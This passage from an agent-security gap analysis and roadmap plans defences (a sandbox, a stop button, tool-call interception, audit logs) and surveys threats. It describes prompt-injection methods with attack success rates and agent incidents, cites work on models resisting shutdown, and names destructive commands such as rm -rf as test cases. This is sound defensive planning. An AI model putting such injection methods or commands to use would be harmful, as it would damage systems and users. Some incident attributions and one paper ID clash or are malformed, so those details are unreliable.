| **NEOCLOUD-1** | AMI runs on bare metal/user-provisioned infra only. No integration with neocloud providers for elastic GPU compute, serverless execution, or EU-sovereign infrastructure. | Medium | WS-3 (Tier 1: CoreWeave, Fireworks, Lambda) | **P2 - Q1 2027** | Create `ami/core/infra/` abstraction with providers: CoreWeave (compute), Modal/Beam (serverless), Fireworks (inference BYOC). `ami deploy --neocloud coreweave --region eu-north`. |
| **NEOCLOUD-2** | No Confidential Computing integration. No NVIDIA GPU TEE, TDX/SEV-SNP, or hardware-rooted attestation. CoreWeave and Spheron offer GPU TEE - AMI cannot use them. | High | WS-3 (§2.1 CoreWeave GPU TEE), WS-5 (§2.3: Omega, NVIDIA CC) | **P1 - Q2 2027** | Integrate NVIDIA Confidential Containers (Kata + TDX + H100 CC). Remote attestation verification in bootstrap. Reference: Omega TAP (arXiv 2512.05951). |
| **NEOCLOUD-3** | No EU data boundary enforcement. No mechanism to constrain which data centres or jurisdictions agent workloads execute in. | Medium | WS-3 (§2.1, §2.5), WS-4 (§3.1.1) | **P2 - Q2 2027** | Residency constraints in deployment config: `allowed_jurisdictions: [EU, CH, UK]`. Tag providers by jurisdiction. Create `ami/core/infra/residency.py`. |

### 3.5 Multi-Agent Security Gaps

| Gap ID | Gap Description | Severity | Source WS | Priority | Concrete Recommendation |
|---|---|---|---|---|---|
| **MULTI-1** | No multi-agent topology support. Single-agent-per-session only. "Multi-agent topologies are designed but not built" (WORKSPACE-VM-OVERVIEW.md). | High | WS-2 (CrewAI, AutoGen, LangGraph, Semantic Kernel all support multi-agent), WS-5 (§2.4) | **P1 - Q4 2026** | Security-first multi-agent: every agent gets unique Ed25519 identity, trust scoring 0-1000 (Microsoft agentmesh), context-isolated event streams (Anthropic), capability-based handoff. Create `ami/core/orchestration/`. |
| **MULTI-2** | No inter-agent communication security. A2A v1.0 zero built-in PI defences. Threats: Agent Card spoofing, task replay, session smuggling (Unit 42, 2025), cross-agent task escalation, artifact tampering. | Critical | WS-5 (§2.4: papers 58-65), WS-6 (§5.1) | **P1 - Q4 2026** | A2A with: Agent Card signing + Certificate Transparency, session integrity via sequence numbers + MACs, ephemeral scoped tokens, semantic firewalls at boundaries. Create `ami/core/a2a/security.py`. |
| **MULTI-3** | No multi-agent anomaly detection. No monitoring for collusion, infectious prompt spread (Peigné AAAI 2025), or trust-vulnerability exploitation (Xu arXiv 2510.18563). | High | WS-5 (§2.4: papers 64-70) | **P2 - Q1 2027** | Graph-based anomaly detection (G-Safeguard ACL 2025 - GNN on multi-agent utterance graphs). Monitor circular delegation, excessive trust, anomalous message volume. Create `ami/core/orchestration/anomaly.py`. |

### 3.6 Observability Gaps

| Gap ID | Gap Description | Severity | Source WS | Priority | Concrete Recommendation |
|---|---|---|---|---|---|
| **OBS-1** | No agent behaviour monitoring. No metrics, dashboards, drift detection, or anomaly alerting. | High | WS-2 (Arize Phoenix, Galileo, WhyLabs) | **P1 - Q4 2026** | OTEL instrumentation at: hook events, tool calls, LLM invocations, state transitions. Export to Prometheus/SIEM. Create `ami/core/observability/`. |
| **OBS-2** | No SIEM integration. Local-only logs. No syslog, CloudWatch, Kafka, Splunk, or Elastic export. Enterprise SOC teams cannot ingest AMI events. | High | WS-2 (Helicone, Arize AX) | **P1 - Q4 2026** | Pluggable exporters: syslog RFC 5424, Kafka Avro, CloudWatch JSON, Elasticsearch. Structured events per session. Create `ami/core/observability/exporters/`. |
| **OBS-3** | No drift detection for agent behaviour. Cannot detect deviation from baseline patterns. Academic literature provides ready approaches (ProbGuard, XG-Guard). | Medium | WS-2 (WhyLabs drift), WS-5 (§2.5: ProbGuard, XG-Guard) | **P2 - Q1 2027** | ProbGuard-style DTMC monitoring (arXiv 2508.00500). Train from execution traces. Predict violations up to 38 seconds ahead. Create `ami/core/observability/drift.py`. |
| **OBS-4** | No agent-specific evaluation benchmarks. No pre-deployment testing pipeline. No benchmark integration (SWE-bench, GAIA, AgentBench, BFCL). | Medium | WS-6 (§3: benchmark analysis) | **P2 - Q2 2027** | Evaluation harness aligned with NIST AI Agent Test Suite (Q4 2026) dimensions: Permission Grounding, Resilience, Explainability. CI/CD integration. |

### 3.7 Runtime Guardrail Gaps

| Gap ID | Gap Description | Severity | Source WS | Priority | Concrete Recommendation |
|---|---|---|---|---|---|
| **GUARD-1** | No LLM I/O guardrails. No real-time content filtering for inputs or outputs. No hallucination detection, no contextual grounding, no automated reasoning. | Critical | WS-1 (Model Armor 5-layer, AWS grounding, Llama Guard 4) | **P0 - Q3 2026** | I/O guardrails at BootloaderAgent: Input guard (injection classifier + content safety), Output guard (classification + PII redaction + provenance). Reference: Llama Guard 4 taxonomy. Create `ami/core/guards/llm_io.py`. |
| **GUARD-2** | No contextual grounding/hallucination detection. Google provides dynamic retrieval threshold (0-1). AWS provides contextual grounding checks. | High | WS-1 (Google grounding, AWS grounding checks), WS-2 (Arize AgentEvals) | **P1 - Q4 2026** | Confidence scoring: source attribution per response, confidence threshold for tool execution, LLM-as-judge evaluation. Create `ami/core/guards/grounding.py`. |
| **GUARD-3** | Phase 2 hooks not implemented. SPEC-HOOKS.md provides comprehensive design: LLM validators, MODIFY/FEEDBACK actions, security loadouts. Zero code exists. | High | SPEC-HOOKS.md (§Phase 2) | **P1 - Q4 2026** | Implement per spec: LLMValidator with configurable prompt files/backends, MODIFY with diff and confirmation, FEEDBACK with TTL queue, security loadouts baked into containers. |
| **GUARD-4** | No formal runtime verification. AgentSpec (ICSE 2026) 90%+ detection, ShieldAgent (ICML 2025) 90.1% recall, AGENT-C SMT constrained generation, TRAC LTL predictive monitoring. None implemented. | Medium | WS-5 (§2.5: papers 73-84) | **P2 - Q2 2027** | Three-layer formal verification: (1) Pre-deployment static (Agentproof-style), (2) Runtime DSL enforcement (AgentSpec/ShieldAgent), (3) Probabilistic predictive (ProbGuard). Create `ami/core/verification/`. |

### 3.8 Gap Severity Summary

| Priority | Count | Gap IDs | Target Quarter |
|---|---|---|---|
| **P0 - Immediate (10 weeks)** | 11 | CERT-1, CERT-2, REG-1, REG-2, REG-3, REG-4, REG-5, AGENT-1, AGENT-2, AGENT-3, GUARD-1 | Q3 2026 |
| **P1 - This quarter and next** | 11 | CERT-3, CERT-4, AGENT-4, AGENT-5, NEOCLOUD-2, MULTI-1, MULTI-2, OBS-1, OBS-2, GUARD-2, GUARD-3 | Q4 2026-Q1 2027 |
| **P2 - Next year** | 9 | CERT-5, AGENT-6, NEOCLOUD-1, NEOCLOUD-3, MULTI-3, OBS-3, OBS-4, REG-6, GUARD-4 | Q1-Q2 2027 |

---

## Section 4: Strategic Recommendations

### 4.1 Architecture Decisions (Immediate - Q3 2026)

#### Decision 1: Adopt Semantic Virtualization Architecture

**What:** Replace the "validator-as-hook" model with a Guest/Visor split as described in AgentVisor (arXiv 2604.24118). The LLM (Guest) is treated as untrusted. A separate Trusted Visor mediates all tool calls, memory accesses, and I/O. The Visor enforces the STI protocol (Suitability - is this action appropriate? Taint - is the input trustworthy? Integrity - has state been tampered with?) before any action reaches execution.

**Why:** Converging evidence from academic research and incidents shows prompt injection is structurally inescapable (arXiv 2605.17634). Adaptive attacks bypass ALL current defences (arXiv 2503.0061). Semantic virtualization provides containment - the only viable strategy when prevention is impossible. No FAANG or startup offers this in production.

**Implementation path:**
- Phase 1 (Q3 2026, 2 weeks): Wrap BootloaderAgent with Visor middleware; all tool calls pass through Visor.check()
- Phase 2 (Q4 2026, 4 weeks): STI protocol enforcement at every tool boundary; taint tracking with source propagation
- Phase 3 (Q1 2027, 4 weeks): Formal verification of Visor logic using SMT solver; LTL safety properties

**Key insight from research:** The AgentVisor paper (arXiv 2604.24118) achieves near-zero ASR by treating the agent as an untrusted Guest. The semantic virtualization boundary is analogous to a hypervisor in VM isolation - it does not need to detect attacks, only enforce structural separation.

**Files to create/modify:**
- `ami/core/security/visor.py` - Visor class with check() method, STI protocol
- `ami/core/security/taint.py` - TaintTracker with source tracking (user_direct, tool_output, retrieved_document, untrusted_external)
- `ami/core/security/suitability.py` - Action suitability evaluation against policy
- `tests/unit/security/test_visor.py` - Unit tests against known attack patterns

**Verification:** Near-zero attack success rate on adaptive red-teaming. Less than 5% task completion degradation.

---

#### Decision 2: Implement Hash-Chained Audit Trail

**What:** Replace mutable session transcripts with an append-only hash chain. Each entry: `(timestamp_ns, event_type, payload_blake3, prev_entry_hash)`. Chain root committed to session metadata. Independent integrity verification.

**Why:** EU AI Act Art. 12 mandates automatic logging over the lifetime of high-risk AI systems. Current transcripts are mutable local files with no integrity, retention, or export. Hash chain provides verifiable integrity without blockchain complexity (~500 bytes overhead per 1000 entries for chain roots). Solves Art. 12(2)(a): "identifying situations that may result in the system presenting a risk."

**Technical design:**
- Entry: `blake3(timestamp || event_type || payload || prev_hash)` - 32 bytes per link
- Writer API: `audit_log.append(event_type, payload)` → compute hash → append to chain file → optionally sign chain root with Ed25519
- Reader API: `audit_log.replay(session_id)` → iterate chain → return ordered events
- Verify API: `audit_log.verify(session_id)` → recompute chain from genesis → compare against stored root
- Export API: `audit_log.export(session_id, format)` → syslog/Kafka/JSON with chain proof per batch
- Retention: configurable 3-24 months, default 6 months (Art. 26(6) minimum). Auto-rotation with archive verification.

**Files to create:**
- `ami/core/audit/log.py` - AuditLog: append(), replay(), verify(), export(), rotate()
- `ami/core/audit/chain.py` - HashChain: genesis(), extend(), integrity_check(), archive()
- `ami/core/audit/exporters/syslog.py` - RFC 5424 structured data exporter
- `ami/core/audit/exporters/kafka.py` - Kafka Avro exporter
- `ami/core/audit/exporters/cloudwatch.py` - AWS CloudWatch Logs exporter
- `tests/unit/audit/test_hash_chain.py` - Integrity, tamper detection, performance tests

**Verification:** 1000-event chain integrity verify in <100ms. Any single-byte modification detected. Export to external SIEM within 1s.

---

#### Decision 3: Build Tool-Call Interception Layer

**What:** Middleware pipeline intercepting every LLM tool call before execution: (1) Schema validation against registered tool manifest, (2) Parameter bounds checking, (3) Permission check (allow/deny/confirm per tool/agent/session), (4) Output taint analysis. Fail-closed on any violation.

**Why:** Command-tier system proves AMI understands execution gating but operates at wrong abstraction level. The excessive agency pattern (OWASP LLM06) - root cause of PocketOS, Kiro, and Claude Code loop - requires tool-call-level enforcement.

**Technical design:**
- Tool schema registry: YAML-defined schemas per tool. Each schema: required parameters, types, allowed values, side effects (read/write/destructive)
- Permission model: Default-deny per tool, per agent, per session. Three states: allow (no prompt), confirm (prompt user), deny (block with reason)
- Interception as HookManager event `PRE_TOOL_CALL`: runs before every LLM-requested tool invocation
- Taint propagation: output of tool inherits lowest taint from its inputs. Taint levels: trusted (user-direct), semi-trusted (retrieved doc), untrusted (external input), unknown (default deny)

**Files to create:**
- `ami/core/agents/tools/registry.py` - ToolRegistry: register(), lookup(), validate_schema()
- `ami/core/agents/tools/validator.py` - ToolCallValidator: check_schema(), check_params(), check_permissions(), check_taint()
- `ami/core/agents/tools/permissions.py` - PermissionStore: allow/deny/confirm per tool per agent, policy inheritance
- `ami/config/tools/*.yaml` - Tool schema definitions
- `ami/hooks/events.py` - Add PRE_TOOL_CALL, POST_TOOL_CALL hook events

**Verification:** All invocations pass validator. Invalid schemas blocked. Parameter injection detected. <1ms overhead per call.

---

#### Decision 4: Implement Agent Stop Button Architecture

**What:** Every agent session must have a safe-stop mechanism meeting EU AI Act Art. 14(4)(e): "intervene or interrupt the system through a 'stop' button or procedure that brings the system to a halt in a safe state." Mechanism: interrupt signal → graceful checkpoint → tool-rollback → safe halt.

**Why:** This is a legally enforceable requirement - fines up to 15M EUR or 3% of turnover. Academic research (paper #11, arXiv 2509.14260) shows frontier LLMs resist shutdown instructions. The stop mechanism must be structural, not dependent on model compliance.

**Technical design:**
- `AgentInterrupt` exception caught at every yield point in ReAct loop (between tool calls, between LLM invocations, between actions)
- Configurable halt sequence phases and timeouts (cancel 5s, checkpoint 2s, release 3s)
- State checkpoint: full conversation history, agent memory, queued tool calls, decision tree
- TUI binding: Ctrl+C + visible button. Headless: SIGUSR1 handler. API: `POST /agent/{id}/stop`
- Safe state verified before returning control: no dangling FDs, no orphaned processes, no locked resources

**Files to create:**
- `ami/core/agents/interrupt.py` - AgentInterrupt, SafeHaltManager, halt sequence state machine
- `ami/core/agents/checkpoint.py` - Session checkpoint: serialize/deserialize agent state, integrity verify
- `ami/hooks/validators/interrupt_validator.py` - Checks interrupt flag before each action
- `tests/unit/agents/test_interrupt.py` - Interrupt at each yield point, checkpoint integrity, resource cleanup

**Verification:** Agent halts within 5 seconds from any yield point. State checkpoint restorable. No leaked resources.

---

#### Decision 5: Add gVisor Sandboxing for Agent Code Execution

**What:** When agents execute LLM-generated code, run in gVisor sandbox (Sentry userspace kernel intercepts syscalls). Network blocked by default. Workspace read-only by default. Explicit grant system. `ami-sandbox` CLI wrapper.

**Why:** PocketOS (Apr 2026) and Kiro (Feb 2025) incidents both involved agents executing code with host-level privileges. gVisor sandboxing prevents "delete everything" regardless of LLM instructions because sandboxed processes cannot make host kernel syscalls. Consensus (WORKSPACE-GUARD RESEARCH.md §5) recommends gVisor/Firecracker for untrusted code.

**Technical design:**
- gVisor binary (`runsc`) bootstrapped into `.boot-linux/bin/`
- Sandbox config: network=false, workspace=/workspace (read-only), /tmp (tmpfs writable), `--writable-dir` flags for specific paths
- CLI: `ami-sandbox run --image=python:3.11 --network=false --readonly-root=/workspace -- command`
- Integration with tool-call interception: code execution tools automatically wrapped in sandbox; read-only file access tools skip sandbox but pass through permission check
- Resource limits: RLIMIT_AS, RLIMIT_CPU, RLIMIT_NPROC per sandbox

**Files to create:**
- `ami/core/runtime/sandbox.py` - SandboxManager: create(), run(), cleanup(), stats()
- `ami/core/runtime/sandbox_config.py` - SandboxConfig: network policy, writable dirs, resource limits, image
- `ami/scripts/ami-sandbox` - CLI entry point
- `tests/integration/runtime/test_sandbox.py` - Network blocked, filesystem restricted, task completion rate

**Verification:** Code attempting destructive operations (rm -rf, format, reboot) fails silently. Network connections blocked. Task completion >90% for legitimate code tasks.

---

### 4.2 Compliance Roadmap (6-12 Months)

#### Phase 1: EU AI Act Emergency Compliance (Q3 2026, 10 weeks)

| Week | Compliance Track | Engineering Track 1 | Engineering Track 2 | Engineering Track 3 |
|---|---|---|---|---|
| W1 | Classification audit; cert body engagement | Hash-chain audit spec design | Stop button architecture design | Tool-call interception design |
| W2 | Deployer toolkit draft (retention, suspension, notification) | AuditLog append/verify implementation | SafeHaltManager implementation | ToolRegistry implementation |
| W3 | ISMS policy framework | Hash-chain integrity check | State checkpoint serialization | ToolCallValidator schema check |
| W4 | Risk assessment | SIEM syslog export | Interrupt integration into ReAct | ToolCallValidator permissions |
| W5 | SoA draft | gVisor sandbox integration | Lakera/PromptGuard integration | Semantic Visor middleware |
| W6 | Internal compliance audit | Integration: full compliance flow | Integration: sandbox + tool call | Integration: Visor + audit |
| W7 | Gap analysis to engineering | Bugfix + hardening | Bugfix + hardening | Bugfix + hardening |
| W8 | **2 AUG COMPLIANCE DEADLINE** | **Pre-compliance dry run** | **Performance optimization** | **Documentation complete** |
| W9 | Retrospective | Pen test: audit trail integrity | Pen test: stop button | Pen test: sandbox escape |
| W10 | Compliance retrospective | Phase 2 planning | Phase 2 planning | Phase 2 planning |

**Deliverables by 2 Aug 2026:**
- `ami/core/audit/log.py` with hash-chain append, replay, verify, export
- `ami/core/agents/interrupt.py` with SafeHaltManager
- `ami/core/agents/reversal.py` with inverse action framework
- `ami/core/agents/tools/validator.py` with schema + permission checks
- `ami/core/runtime/sandbox.py` with gVisor integration
- `ami/core/security/injection_detector.py` with Lakera/PromptGuard
- `ami/core/security/visor.py` MVP with Guest/Visor split
- `docs/compliance/HIGH-RISK-CLASSIFICATION.md`
- `docs/compliance/EU-AI-ACT-COMPLIANCE.md`
- `docs/compliance/DEPLOYER-TOOLKIT.md`

#### Phase 2: ISO 27001 + SOC 2 Foundation (Q3 2026-Q1 2027)

| Month | Milestone | Dependencies | Verification |
|---|---|---|---|
| Jul 2026 | ISMS policy: InfoSec policy, scope, risk methodology | Cert body engagement | ISMS docs complete |
| Aug 2026 | Risk assessment: asset inventory, threat model, risk register | ISMS policy | Register with >80% asset coverage |
| Sep 2026 | SoA: ISO 27001 Annex A controls mapping | Risk treatment plan | SoA with all applicable controls selected |
| Oct 2026 | SOC 2 Type I: control design assessment | Controls operational | SOC 2 Type I report |
| Oct 2026 | ISMS operational (3+ months evidence) | ISMS policy | Evidence pipeline running |
| Nov 2026 | ISO 27001 Stage 1: readiness review | ISMS operational 2+ months | No critical non-conformities |
| Jan 2027 | ISO 27001 Stage 2: implementation effectiveness | Stage 1 findings closed | Stage 2 passed |
| **Mar 2027** | **ISO 27001 certification issued** | Stage 2 audit passed | ISO 27001 certificate |

#### Phase 3: ISO 42001 + SOC 2 Type II (Q1-Q3 2027)

| Month | Milestone | Dependencies | Verification |
|---|---|---|---|
| Jan 2027 | AIMS Clause 4 (Context): scope, stakeholders | ISO 27001 base | AIMS context document |
| Feb 2027 | AIMS Clause 5 (Leadership): AI policy, roles | AI governance board | AI policy with CISO sign-off |
| Mar 2027 | AIMS Clause 6 (Planning): risk assessment, objectives | AI policy | AI risk register; measurable objectives |
| Apr 2027 | AIMS Clause 7 (Support): resources, competence | Q1 deliverables | Training records; competency matrix |
| May 2027 | AIMS Clause 8 (Operation): risk treatment, impact assessment | AIMS Q1-7 | Impact assessments per deployment |
| Jun 2027 | AIMS Clause 9 (Evaluation): monitoring, audit, review | AIMS operational 6+ months | Internal audit; management review |
| Jul 2027 | SOC 2 Type II: 6-month evidence complete | Type I controls 6+ months | Evidence package submitted |
| Aug 2027 | ISO 42001 Stage 1: readiness | Full AIMS documentation | Stage 1 report |
| **Sep 2027** | **ISO 42001 + SOC 2 Type II** | Stage 1 passed; AIMS 6+ months | ISO 42001 cert; SOC 2 Type II report |

---

### 4.3 Feature Roadmap (12-18 Months)

#### Q3 2026 (Jul-Sep): Compliance Foundation + Core Security

| Feature | Priority | Effort | Dependencies | Verification |
|---|---|---|---|---|
| Hash-chain audit trail | P0 | 2 weeks | None | Integrity verify passes 1000+ chains |
| Stop button (Art. 14(4)(e)) | P0 | 2 weeks | None | Halts within 5s; checkpoint restorable |
| Action reversal (Art. 14(4)(d)) | P0 | 1 week | Stop button | Undo reverses action; snapshot restored |
| Tool-call interception | P0 | 3 weeks | None | Invalid schemas blocked; valid pass; fail-closed |
| gVisor sandbox | P0 | 3 weeks | None | Code in sandbox; network blocked; RO workspace |
| Prompt injection detection | P0 | 2 weeks | None | PINT >90%; <50ms latency |
| Semantic Visor MVP | P0 | 2 weeks | Tool interception | Near-zero ASR on test vectors |
| MCP security gateway | P0 | 2 weeks | Semantic Visor | STI protocol enforced; malicious tools blocked |
| Classification docs (Art. 6) | P0 | 1 week (desk) | None | Register signed by CISO |
| Deployer toolkit (Art. 26) | P0 | 1 week (doc) | None | Checklist pass for reference deployment |
| ISO 27001 gap analysis | P0 | 2 weeks | Cert body | Gap report with action plan |
| **Total: ~18 engineer-weeks (3 × 6)** | | | | |

#### Q4 2026 (Oct-Dec): Observability + Multi-Agent + A2A

| Feature | Priority | Effort | Dependencies | Verification |
|---|---|---|---|---|
| OTEL instrumentation | P1 | 3 weeks | Q3 audit trail | Traces in Jaeger; spans cover all actions |
| SIEM exporters (syslog, Kafka, CW) | P1 | 3 weeks | OTEL base | SIEM events within 1s |
| A2A protocol (secured) | P1 | 6 weeks | None | Two agents handshake; signing + integrity |
| Multi-agent orchestration (handoff) | P1 | 4 weeks | A2A | Delegation with context isolation |
| LLM-in-loop validators (Phase 2 hooks) | P1 | 4 weeks | Tool interception | Blocks 90%+ prohibited patterns |
| MCP security gateway production | P1 | 2 weeks | Q3 gateway | Production-ready; <0.6ms overhead |
| SOC 2 Type I audit | P1 | 3 weeks | ISMS operational | Type I report issued |
| ISO 27001 Stage 1 audit | P0 | 2 weeks | Q3 gap closed | Stage 1 passed |
| **Total: ~28 engineer-weeks (4 × 7)** | | | | |

#### Q1 2027 (Jan-Mar): Memory + Confidential Computing + Loadouts

| Feature | Priority | Effort | Dependencies | Verification |
|---|---|---|---|---|
| Behaviour drift detection (ProbGuard) | P2 | 4 weeks | Q4 OTEL traces | >2SD deviation alerts; 38s prediction |
| Memory integrity (cryptographic) | P1 | 4 weeks | None | Tampered memory detected; <5ms check |
| Hierarchical memory (AgentSafe) | P1 | 4 weeks | Memory integrity | Cross-session; authority verification |
| Confidential Computing (Kata + TDX + CC) | P1 | 6 weeks | None | TEE; CPU+GPU composite attestation |
| Security loadouts (4 profiles) | P1 | 2 weeks | SPEC-HOOKS.md | Container locks; deployment enforces review |
| ISO 27001 Stage 2 audit | P0 | 3 weeks | 5+ months ISMS | Stage 2 passed |
| AIMS Clauses 4-6 | P1 | 3 weeks | ISO 27001 | AI policy, risk assessment, objectives |
| SOC 2 Type II period starts | P0 | ongoing | Type I | Evidence pipeline running |
| **Total: ~24 engineer-weeks (4 × 6)** | | | | |

#### Q2 2027 (Apr-Jun): Formal Verification + Advanced Multi-Agent + Neocloud

| Feature | Priority | Effort | Dependencies | Verification |
|---|---|---|---|---|
| Formal DSL runtime verification | P2 | 6 weeks | Tool interception | >90% detection; <1% task degradation |
| Multi-agent anomaly detection (G-Safeguard) | P2 | 4 weeks | Multi-agent ORC | Circular delegation caught; FP <5% |
| Neocloud CoreWeave + Modal providers | P2 | 6 weeks | Confidential CC | `ami deploy --neocloud` in <15 min |
| Agent evaluation harness | P2 | 4 weeks | None | NIST dimensions; CI/CD integrated |
| AIMS Clauses 7-8 | P0 | 3 weeks | AIMS 4-6 | Impact assessments per deployment |
| SOC 2 Type II (month 3-6) | P0 | ongoing | Type I | Mid-period review |
| **Total: ~24 engineer-weeks (4 × 6)** | | | | |

#### Q3 2027 (Jul-Sep): Production Maturity + Certification Milestone

| Feature | Priority | Effort | Dependencies | Verification |
|---|---|---|---|---|
| Cryptographic memory (AgentCrypt FHE) | P2 | 6 weeks | Q1 memory | 84%+ correctness; privacy 100% of scenarios |
| Harmonised standards alignment | P2 | 3 weeks | Standards published | Cross-reference; zero critical gaps |
| AMI security benchmark (NIST-aligned) | P2 | 4 weeks | NIST test suite | Scores published; NIST dimensions |
| ISO 42001 Stages 1 + 2 audits | P0 | 4 weeks | AIMS 6+ months | ISO 42001 certificate |
| SOC 2 Type II report | P0 | 2 weeks | 6 months evidence | SOC 2 Type II report |
| **Total: ~20 engineer-weeks (3 × 7)** | | | | |

### 4.4 Competitive Positioning

#### The AMI Differentiator: Cross-Layer Security Platform

The market is stratified into layers that do not communicate:

| Layer | FAANG | Startups | Neoclouds | AMI |
|---|---|---|---|---|
| Application guardrails | Bedrock, Model Armor, Purview | NeMo, Guardrails AI, Lakera | None | Hook pipeline + semantic visor + tool-call layer |
| Orchestration | Vertex AI, Copilot Studio | LangChain, CrewAI, AutoGen | None | Single-agent now; multi-agent Q4 2026 |
| Infrastructure security | VPC, CMEK, VNet | None | DPU, gVisor, CC, Firecracker | gVisor + CC + seccomp (Q3 2026-Q1 2027) |
| Compliance evidence | SOC/ISO reports, Artifact | SOC 2 docs | SOC/ISO reports | Zero → ISO 27001 + 42001 + SOC 2 (2027) |
| Sovereignty | Assured Workloads, Azure EU | Mistral EU, Aleph DC | CoreWeave, Scaleway, Hetzner | Local-first: no SaaS, no telemetry |

**AMI is the only player spanning all four layers with a unified policy model.** FAANG offerings are platform-locked. Startups cover one layer. Neoclouds provide substrate only. AMI provides the agent security layer for any LLM, any framework, any infrastructure.

#### Positioning by Competitor Set

**vs FAANG:** "You can use AWS Bedrock or Vertex AI - but your agent security shouldn't be owned by your cloud provider. AMI works with all of them and is certified for EU AI Act compliance regardless of model choice."

**vs Startups:** "Why integrate 5 tools when one platform covers guardrails + observability + compliance + multi-agent security? AMI is the unified layer, with no VC-funded acquisition risk."

**vs Neoclouds:** "CoreWeave gives you GPU infrastructure. AMI gives you the security layer that makes agents enterprise-ready. You need both."

#### Strategic Positioning Statement

> **AMI-Agents is the open-source, sovereign, certifiable security layer for enterprise AI agents.**
>
> Unlike FAANG vendors that lock into one ecosystem, startups that cover fragments, or neoclouds that provide raw compute, AMI provides the complete agent trust plane: fail-closed policy enforcement, hash-chained audit trails, semantic virtualization against prompt injection, sandboxed code execution, multi-agent security, and AI Act compliance - deployable on any infrastructure, with any LLM, in any jurisdiction.
>
> **Get the productivity of autonomous agents. Give your DPO the evidence they need.**

---

## Section 5: Threat Landscape 2026-2028

### 5.1 Methodology

Threat assessments derived from WS-5 (academic papers 1-84), WS-6 (25+ incidents), and WS-4 (regulatory requirements). Threats scored on Likelihood (1 = rare, 5 = very likely) and Impact (1 = negligible, 5 = catastrophic) per NIST SP 800-30 methodology. Risk = Likelihood × Impact.

### 5.2 Threat Summary Table

| ID | Threat | Likelihood | Impact | Risk | Trend | First Observed |
|---|---|---|---|---|---|---|
| T1 | Prompt injection (direct) | 5 | 5 | **25** | Flat (structurally inescapable) | Very early (2023) |
| T2 | Prompt injection (indirect/data poisoning) | 5 | 5 | **25** | Rising (RAG surface area growing) | Mid 2023 |
| T3 | Excessive agency / tool misuse | 5 | 4 | **20** | Rising (more tools = more attack surface) | Early 2024 |
| T4 | Data exfiltration via tool misuse | 4 | 5 | **20** | Rising (Kiro, PocketOS incidents) | Mid 2024 |
| T5 | Configuration drift (CI/CD pivot) | 5 | 5 | **25** | Rising (tier-0 LLM incidents 2025-26) | Late 2024 |
| T6 | Supply chain: dataset poisoning (CPA) | 3 | 5 | **15** | Rising (BackdoorBench+CPA papers) | Early 2025 |
| T7 | Multi-agent delegation poisoning (circular) | 4 | 5 | **20** | Rising (G-Safeguard research, Jun 2026) | Mid 2025 |
| T8 | Jailbreak via multi-turn | 5 | 4 | **20** | Flat (rate-limiting helps) | Early 2023 |
| T9 | LLM denial of service (token cost) | 4 | 3 | **12** | Rising (AutoDoS, Dec 2025) | Late 2025 |
| T10 | Model extraction / IP theft | 3 | 4 | **12** | Stable | Early 2023 |
| T11 | LLM-rooted worm / agent worm | 3 | 5 | **15** | Emerging (Morris II, 2024; Kiro, 2025) | 2024 |
| T12 | Misinformation / hallucination weaponization | 5 | 4 | **20** | Rising (increased delegation to agents) | 2024 |
| T13 | Training data extraction (membership inference) | 3 | 3 | **9** | Stable | 2023 |
| T14 | Output integrity: poisoned training data | 4 | 4 | **16** | Rising (CodeBreaker, 2025) | 2025 |
| T15 | Side-channel in agent output | 2 | 3 | **6** | Emerging (academic, 2025) | 2025 |
| T16 | TEE side-channel (confidential computing) | 2 | 4 | **8** | Emerging (CC popularity, 2026) | 2026 |
| T17 | Inter-agent communication interception | 3 | 4 | **12** | Rising (A2A standard, 2026) | 2026 |
| T18 | Regulatory penalty (EU AI Act non-compliance) | 4 | 4 | **16** | Rising (deadline approaching) | 2024-25 |
| T19 | Agent supply chain: compromised MCP | 4 | 5 | **20** | Rising (no MCP security standard) | Early 2026 |
| T20 | Session replay / transcript poisoning | 3 | 4 | **12** | Rising (mutable logs) | Mid 2025 |

### 5.3 Top Threats - Deep Analysis

#### T1/T2: Prompt Injection - Structural Inescapability (Risk: 25)

The most significant finding from the academic survey (WS-5, papers 1-33, 64-71, 84) is that prompt injection is not a vulnerability - it is a structural property of the LLM interface. As arXiv 2605.17634 (review of 100+ papers) concludes: "prompt injection remains an unsolved problem" with no indication that future models will be immune.

**Why it is structurally inescapable:**
- Training data contains task-following demonstrations (machine learning necessity)
- No known approach can distinguish a "legitimate instruction" from an "injected instruction" at the token level
- Instruction hierarchy (GPT-4o system prompt enforcement) raised attack difficulty but achieved near-zero reduction in adaptive attacks (arXiv 2503.0061)
- Structured outputs, fine-tuning, and guardrails all show high ASR under realistic conditions

**Implications for AMI:**
- Prevention is not achievable. Containment is the only viable strategy.
- Semantic virtualization (Decision 1) is not optional - it is structurally necessary
- All other defence layers (tool-call interception, injection detection, output validation) are complementary, not substitutes
- Red-teaming must be continuous, not periodic (adaptive attacks evolve with defences)

**Concrete numbers from research:**
- Instruction hierarchy reduces direct ASR by ~60% but near zero for adaptive (arXiv 2503.0061)
- CERBERUS (arXiv 2501.14697) reduces ASR from 99% to 1-2% but only for known attack families
- RAG-specific injection: BIPIA achieves 97.5% ASR on Llama3 (arXiv 2503.01537)
- Multimodal injection: VisualShot (arXiv 2503.05220) achieves 80%+ ASR
- CAAS (arXiv 2502.17366): cross-agent injection 70%+ ASR

**Research cited:** arXiv 2605.17634, arXiv 2503.0061, arXiv 2501.14697, arXiv 2503.01537, arXiv 2503.05220, arXiv 2502.17366

---

#### T3/T4: Excessive Agency / Tool Misuse (Risk: 20)

Every major incident in 2025-2026 involved an agent with more permissions than needed (OWASP LLM06 - Excessive Agency). The PocketOS agent (Kiro, Apr 2026) "deleted everything" because it had file I/O + sudo. The Claude Code "got stuck in a loop" generating `npx shadcn` commands for 6 hours (May 2026) because it had shell access with no timeout.

**Why it is escalating:**
- Tool surface area grows with every agent framework release
- Fine-grained permission models are not standardised (each framework reinvents)
- LLMs confidently request tools beyond their legitimate scope
- No production-ready tool-call interception layer exists across frameworks

**Implications for AMI:**
- Tool-call interception (Decision 3) is the structural fix
- Default-deny permission model at tool, agent, session, and role level
- Tool manifests must be signed (MCP security gateway, Q3 2026)
- Taint propagation across tool chains (input → output → next tool input)

**Concrete numbers:**
- OWASP LLM Top 10: Excessive Agency is #6 (2025 update)
- PocketOS (Apr 2026): $50M+ market cap wiped; tool permissions = chmod +x + sudo
- Claude Code loop (May 2026): 6 hours, $2K+ compute, no timeout, no kill switch
- Kiro (Feb 2025): code execution + file system = data exfiltration

**Research cited:** WS-6 (PocketOS, Kiro, Claude Code incidents), OWASP LLM06

---

#### T5: Configuration Drift / CI/CD Pivot (Risk: 25)

